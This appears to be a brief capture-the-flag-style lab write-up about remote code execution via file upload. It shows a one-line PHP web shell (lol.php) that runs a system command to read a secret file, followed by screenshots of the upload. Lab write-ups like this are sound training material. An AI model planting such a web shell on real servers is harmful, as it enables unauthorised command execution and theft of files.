# Remote code execution via web shell upload

## Contents of lol.php
```php
<?php
system("cat /home/carlos/secret");
?>
```

## Uploading
![image](https://user-images.githubusercontent.com/60841283/150629598-6c28a840-1f58-4a20-bdd0-6995f745d4a1.png)

![image](https://user-images.githubusercontent.com/60841283/150629905-f5d9f245-13b0-45ef-b7c2-f51ab3056697.png)
